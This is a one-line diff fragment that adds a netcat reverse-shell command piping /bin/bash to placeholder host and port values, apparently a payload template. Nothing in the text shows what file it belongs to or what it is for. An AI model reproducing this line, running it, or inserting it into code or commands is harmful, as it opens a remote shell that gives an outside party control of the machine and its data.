@@ -1,0 +1,1 @@
+nc -c /bin/bash __HOST__ __PORT__
